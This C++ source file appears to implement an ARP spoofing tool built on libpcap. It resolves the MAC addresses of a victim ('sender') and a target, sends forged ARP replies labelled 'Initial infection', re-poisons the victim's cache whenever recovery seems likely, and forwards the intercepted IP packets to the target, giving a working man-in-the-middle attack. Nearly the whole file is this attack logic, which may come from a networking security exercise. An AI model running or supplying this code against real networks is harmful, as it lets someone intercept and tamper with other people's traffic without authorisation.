#include "session.h"
#include <iostream>

#define MAC_CMP(x, y) memcmp((x), (y), 6)
#define IP_CMP(x, y) memcmp((x), (y), 4)
#define READ_MAC(x, y) memcpy((x), (y), 6)
#define SET_MAC(x, y) memcpy((x), (y), 6)
#define WAIT(x) sleep((x))

extern uint8_t mac_addr[6];
extern uint8_t ip_addr[4];

extern bool run;

static void
PrintSessionInfo(uint8_t sender_mac[6],
                 uint8_t sender_ip[4],
                 uint8_t target_mac[6],
                 uint8_t target_ip[4])
{
  printf("[*] Session Info\n");
  printf("    sender: %u.%u.%u.%u with MAC address "
         "%02X:%02X:%02X:%02X:%02X:%02X\n",
         sender_ip[0],
         sender_ip[1],
         sender_ip[2],
         sender_ip[3],
         sender_mac[0],
         sender_mac[1],
         sender_mac[2],
         sender_mac[3],
         sender_mac[4],
         sender_mac[5]);
  printf("    target: %u.%u.%u.%u with MAC address "
         "%02X:%02X:%02X:%02X:%02X:%02X\n",
         target_ip[0],
         target_ip[1],
         target_ip[2],
         target_ip[3],
         target_mac[0],
         target_mac[1],
         target_mac[2],
         target_mac[3],
         target_mac[4],
         target_mac[5]);

  return;
}

// Send ARP request packet to sender and get MAC address
// return 1 if successfully get MAC address,
//        0 if no reply from sender
static int
GetHwAddr(pcap_t* handle, uint8_t sender_ip[4], uint8_t sender_mac[6])
{
  // Send ARP request packet three times
  for (int i = 0; i < 3; i++) {
    SendArpMsg(
      handle, mac_addr, ip_addr, nullptr, sender_ip, ArpHeader::ARP_H_REQUEST);

    // Wait for ARP reply
    WAIT(2);

    pcap_pkthdr header;

    while (const u_char* reply = pcap_next(handle, &header)) {
      u_char* _packet = const_cast<u_char*>(reply);
      ArpMsg* packet = reinterpret_cast<ArpMsg*>(_packet);

      // Check whether captured packet is from valid sender
      // and whether the packet is ARP reply
      if (!packet->eth_header.isARP() || packet->arp_header.isRequest() ||
          IP_CMP(packet->arp_header.s_ip, sender_ip)) {
        continue;
      }

      READ_MAC(sender_mac, packet->eth_header.smac);

      return 1;
    }
  }

  fprintf(stderr,
          "Log: no ARP reply from %u.%u.%u.%u\n",
          sender_ip[0],
          sender_ip[1],
          sender_ip[2],
          sender_ip[3]);

  return 0;
}

static int
ForwardPacket(pcap_t* handle,
              pcap_pkthdr* header,
              Packet* relay,
              uint8_t target_mac[6],
              uint8_t target_ip[4])
{
  SET_MAC(relay->eth_header.smac, mac_addr);
  SET_MAC(relay->eth_header.dmac, target_mac);

  if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(relay), header->len)) {
    fprintf(stderr,
            "Error Log: could not forward packet to target %u.%u.%u.%u\n",
            target_ip[0],
            target_ip[1],
            target_ip[2],
            target_ip[3]);
    return -1;
  }

  printf("Log: forwarding packet to %u.%u.%u.%u(%u)\n",
         target_ip[0],
         target_ip[1],
         target_ip[2],
         target_ip[3],
         header->len);

  return 1;
}

void
ArpSpoof(const char* ifname, const char* sender_ip, const char* target_ip)
{
  uint8_t _sender_ip[4];
  uint8_t _target_ip[4];

  uint8_t _sender_mac[6];
  uint8_t _target_mac[6];

  ReadIP(_sender_ip, sender_ip);
  ReadIP(_target_ip, target_ip);

  if (!IP_CMP(_sender_ip, ip_addr) || !IP_CMP(_target_ip, ip_addr) ||
      !IP_CMP(_sender_ip, _target_ip)) {
    fprintf(stderr, "Invalid sender or target address\n");
    return;
  }

  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(ifname, 65536, 1, -1, errbuf);

  if (!handle) {
    fprintf(stderr, "Unable to open the adapter. %s\n", ifname);
    return;
  }

  // Get MAC address of both sender and target
  if (GetHwAddr(handle, _sender_ip, _sender_mac) != 1 ||
      GetHwAddr(handle, _target_ip, _target_mac) != 1) {
    pcap_close(handle);
    return;
  }

  PrintSessionInfo(_sender_mac, _sender_ip, _target_mac, _target_ip);

  // Initial infection
  for (int i = 0; i < 3; i++) {
    SendArpMsg(handle,
               mac_addr,
               _target_ip,
               _sender_mac,
               _sender_ip,
               ArpHeader::ARP_H_REPLY);
  }

  while (run) {
    pcap_pkthdr header;
    const u_char* packet = pcap_next(handle, &header);

    if (!packet) {
      continue;
    }

    u_char* _relay = const_cast<u_char*>(packet);
    Packet* relay = reinterpret_cast<Packet*>(_relay);

    if (relay->eth_header.isARP()) {
      const ArpMsg* arp_packet = reinterpret_cast<ArpMsg*>(relay);

      if (arp_packet->arp_header.isReply()) {
        continue;
      }

      // If captured ARP request packet is broadcast from target,
      // send crafted ARP reply packet to sender to prevent sender from recovery
      if (!IP_CMP(arp_packet->arp_header.s_ip, _target_ip) &&
          arp_packet->eth_header.isBroadcast()) {
        SendArpMsg(handle,
                   mac_addr,
                   _target_ip,
                   _sender_mac,
                   _sender_ip,
                   ArpHeader::ARP_H_REPLY);
        continue;
      }

      // If capture ARP request is from sender
      // and destination IP address is target's IP address.
      // The packet can be either broadcast or unicast to attacker
      if (!IP_CMP(arp_packet->arp_header.s_ip, _sender_ip) &&
          !IP_CMP(arp_packet->arp_header.d_ip, _target_ip)) {
        SendArpMsg(handle,
                   mac_addr,
                   _target_ip,
                   _sender_mac,
                   _sender_ip,
                   ArpHeader::ARP_H_REPLY);
        continue;
      }
    }

    // Captured packet is IP packet,
    // check whether captured packet is spoofed packet
    if (!MAC_CMP(relay->eth_header.dmac, mac_addr) &&
        !MAC_CMP(relay->eth_header.smac, _sender_mac) &&
        IP_CMP(relay->ipv4_header.dest_addr, ip_addr)) {
      ForwardPacket(handle, &header, relay, _target_mac, _target_ip);
    }
  }

  return;
}